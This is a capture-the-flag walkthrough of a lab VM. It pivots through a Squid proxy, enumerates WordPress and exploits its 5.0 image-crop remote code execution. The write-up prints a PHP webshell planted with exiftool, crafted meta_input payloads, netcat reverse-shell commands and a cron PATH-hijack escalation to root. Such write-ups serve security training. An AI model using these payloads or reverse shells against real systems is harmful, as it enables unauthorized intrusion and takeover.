## Information Gathering
### Host Discovery

The following ARP scan discovered the target machine.

```console
root@kali:~# arp-scan -I vmnet1 172.16.178.0/24
Interface: vmnet1, type: EN10MB, MAC: 00:50:56:c0:00:01, IPv4: 172.16.178.1
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
172.16.178.132  08:00:27:1b:58:27       PCS Systemtechnik GmbH
172.16.178.254  00:50:56:e4:1e:ec       VMware, Inc.
```

### Port Scanning

Once the target machine was discovered, a full TCP port scan was performed, whose only service on port 8080 is open.

```console
root@kali:~# nmap -v -n -T4 -p- 172.16.178.132 -oG nmap/all-tcp-ports.txt
...
PORT     STATE SERVICE
8080/tcp open  http-proxy
```

### Service Enumeration

With the results of service enumeration, it was detected that it is a proxy web server.

```console
root@kali:~# nmap -v -n -sVC -p8080 172.16.178.132 -oN nmap/service-enum.txt
...
PORT     STATE SERVICE    VERSION
8080/tcp open  http-proxy Squid http proxy 3.5.27
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/3.5.27
```

### Enumerating Squid Web Proxy

The service on port 8080 is an http web proxy, which provides proxy and cache services for Hyper Text Transport Protocol (HTTP), File Transfer Protocol (FTP), and other popular network protocols.

![](/assets/images/jerome/screenshot-1.png)

It is necessary to comment out the last line of the **/etc/proxychains4.conf** file as follows, and add **http 172.16.178.132 8080**. This needs to be setted to use proxychains and so to find available open ports.

```console
root@kali:~# tail -3 /etc/proxychains4.conf
#socks4 127.0.0.1 9050
#
http 172.16.178.132 8080
```

The full TCP connect scan discovered two open ports in addition to the last port found.

```console
root@kali:~# proxychains -q nmap -n -v -sT -p- 127.0.0.1
...
PORT     STATE SERVICE
80/tcp   open  http
1337/tcp open  waste
8080/tcp open  http-proxy
```

To know really what service is running on these ports, service detection, script scanning, OS discovery and traceroute was effected.

```console
root@kali:~# proxychains -q nmap -n -v -sT -A -p80,1337,8080 127.0.0.1
...
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| http-methods:
|_  Supported Methods: OPTIONS HEAD GET POST
1337/tcp open  http       Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| http-methods:
|_  Supported Methods: OPTIONS HEAD GET POST
8080/tcp open  http-proxy Squid http proxy 3.5.27
|_http-server-header: squid/3.5.27
|_http-title: ERROR: The requested URL could not be retrieved
```

Firefox is started using proxychains to be able to interact with the web site running on port 80 and 1337.

```console
root@kali:~# proxychains firefox 127.0.0.1 >&/dev/null & ; disown
```

Not much is observed obout the page on port 80.

Then, focus shifts to port 1337, dirb is started using proxychains to find any hidden web resource, giving as result a **wordpress** directory, which looks interesting.

```console
root@kali:~# proxychains -q dirb http://127.0.0.1:1337
...
+ http://127.0.0.1:1337/index.html (CODE:200|SIZE:0)
+ http://127.0.0.1:1337/server-status (CODE:200|SIZE:4029)
==> DIRECTORY: http://127.0.0.1:1337/wordpress/
```

### Wordpress Enumeration

It is verified that a wordpress CMS is running on port 1337.

![](/assets/images/jerome/screenshot-3.png)

An scan is effected to the wordpress CMS, which discovered its current version, users and themes.

```console
root@kali:~# proxychains -q wpscan --url http://127.0.0.1:1337/wordpress/ -e ap,at,u

In the results of wpscan the version of the CMS wordpress 5.0 was noticed. Searching for known vulnerabilities, it is observed that is vulnerable to **Remote Code Execution**.

```console
root@kali:~# searchsploit wordpress 5.0

## Exploitation
### Wordpress 5.0 Remote Code Execution

WordPress before 4.9.9 and 5.x before 5.0.1 allows remote code execution because an _wp_attached_file Post Meta entry can be changed to an arbitrary string, such as one ending with a .jpg?file.php substring. An attacker with author privileges can execute arbitrary code by uploading a crafted image containing PHP code in the Exif metadata. Exploitation can leverage CVE-2019-8943. 

It is recommended to consult this link to better understand the vulnerability. [WordPress 5.0.0 Remote Code Execution](https://blog.sonarsource.com/wordpress-image-remote-code-execution/).

The steps in the following youtube video were followed as reference to exploit this vulnerability.

{% include embed/youtube.html id='6Sxs4vQJK_s' %}

It is started burpsuite.

```console
root@kali:~# proxychains burpsuite >&/dev/null & ; disown
```

Once firefox is started, in the navigation bar enter **about:preferences** then choose **Network Settings**, select **Settings...**, set it as follows to be able to intercept the requests sent to the web application with burpsuite and click **OK**.

![](/assets/images/jerome/screenshot-6.png)

In burpsuite, select **Proxy->Options**, and configure it as follows.

![](/assets/images/jerome/screenshot-7.png)

So far everything is ready to start the exploitation process.

A webshell was added as exif comment to the image.

```console
root@kali:~# exiftool -comment="<?php system(\$_GET['cmd']); ?>" rem.jpg
 1 image files updated
```

Login to wordpress CMS, choose **Media->Add New** and click **Select Files**.

![](/assets/images/jerome/screenshot-8.png)

Once the image is selected, click **Edit**.

![](/assets/images/jerome/screenshot-9.png)

In burpsuite, verify that **Intercept is on** is enabled, and click **Update**.

![](/assets/images/jerome/screenshot-10.png)

Go to Bupsuite, in any place of the request, right click and **Send to Repeater**, forward the request, and turn to **Intercept is off**

![](/assets/images/jerome/screenshot-11.png)

In firefox, click **Edit Image**.

![](/assets/images/jerome/screenshot-12.png)

Select any area of the image and crop it.

![](/assets/images/jerome/screenshot-13.png)

Enable the intercept in burpsuite, then go back to firefox and click **Save**.

![](/assets/images/jerome/screenshot-14.png)

In burpsuite, in any place of the request, right click and **Send to Repeater**, forward the request and turn to **Intercept is off**.

![](/assets/images/jerome/screenshot-15.png)

In burpsuite, click the **Repeater** tab, append the following payload to the post data, and click **Send**.

`&meta_input[_wp_attached_file]=2022/10/rem.jpg#/rem.jpg`

![](/assets/images/jerome/screenshot-16.png)

Go to tab 2, and click **Send**.

![](/assets/images/jerome/screenshot-17.png)

The image was created. Go to tab 1 again, enter the following payload to the post data, and click **Send**.

`&meta_input[_wp_attached_file]=2022/10/rem.jpg#/../../../../themes/twentynineteen/rem.jpg`

![](/assets/images/jerome/screenshot-18.png)

Go to tab 2, and click **Send**.

![](/assets/images/jerome/screenshot-19.png)

The cropped image was created into the theme, this will be taked to build the last payload.

Go back to firefox, so it is necessary to create a post, click on **Dashboard**, in the **Quick Draft** section fill the fields, make sure that the **Intercept is on** in burpsuite, and click on **Save Draft**. In burpsuite, click on any place of the request and **Send To Repeater**.

![](/assets/images/jerome/screenshot-20.png)

In burpsuite click the **Repeater** tab, then click tab 3, and add the following payload to the post data.

`&meta_input[_wp_page_template]=rem-e1666011994918.jpg`

![](/assets/images/jerome/screenshot-21.png)

In firefox, click **Posts**, click **Preview** to visualize the created post.

![](/assets/images/jerome/screenshot-22.png)

In the navigation bar type the following to check if the **id** command is executed.

`localhost:1337/wordpress/?p=333&cmd=id`

![](/assets/images/jerome/screenshot-23.png)

Set up a netcat listener on port 443, and type the following in the address bar.

`localhost:1337/wordpress/?p=333&cmd=nc 172.16.178.1 443 -c /bin/bash`

![](/assets/images/jerome/screenshot-24.png)

It was obtained a shell with user **jerome** privileges.

```console
root@kali:~# nc -vlnp 443
listening on [any] 443 ...
connect to [172.16.178.1] from (UNKNOWN) [172.16.178.132] 55284
python3 -c 'import pty; pty.spawn("/bin/bash")'
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

jerome@jerome:/var/www/html/wordpress$
```

**Automated Exploitation**

If you are comfortable using automated tools, I developed a python script that makes the exploitation process much easier, the exploit can be found [here](https://github.com/ret2x-tools/poc-wordpress-5.0.0.git).

```console
root@kali:~/# proxychains -q python3 poc.py --url http://localhost:1337/wordpress -u jerome -p jerome -lhost 172.16.178.1 -lport 443
[*] Authenticating to wordpress

uid=1000(jerome) gid=1000(jerome) groups=1000(jerome),27(sudo)
jerome@jerome:/var/www/html/wordpress$
```

```console
Listing the user flag 
jerome@jerome:/home/jerome$ cat flag.txt
cat flag.txt
b0ed001c825
```

By listing the crontab file, it was identified that a shell script is being executed at boot time.

```console
jerome@jerome:/home/jerome$ tail -2 /etc/crontab
tail -2 /etc/crontab
@reboot         root    /bin/bash /usr/share/simulate.sh
@reboot         root    dhclient
```

It was noted in the script that it is possible to execute the **ls** command at jerome's home directory, since the command does not have its absolute path, there is the opportunity to hijack its path.

```console
jerome@jerome:/home/jerome$ cat /usr/share/simulate.sh
cat /usr/share/simulate.sh
#
# This script simulates human behaviour from the root account
#

while true
do
    cd /home/jerome;
    ls;
    sleep 120;
done
```

## Privilege Escalation
### Cron Job

At jerome's home directory, create the **ls** file with the netcat reverse shell and add execute permissions to it.

```console
jerome@jerome:/home/jerome$ echo "nc 172.16.178.1 4444 -c /bin/bash" > ls
echo "nc 172.16.178.1 4444 -c /bin/bash" > ls
jerome@jerome:/home/jerome$ chmod +x ls
chmod +x ls
```

Start a netcat listener on port 4444, reboot the machine and a root shell was received.

```console
root@kali:~# nc -vlnp 4444
listening on [any] 4444 ...
connect to [172.16.178.1] from (UNKNOWN) [172.16.178.132] 42766
script -qc /bin/bash /dev/null
root@jerome:/home/jerome# cd
cd
root@jerome:~# cat flag.txt
cat flag.txt

```
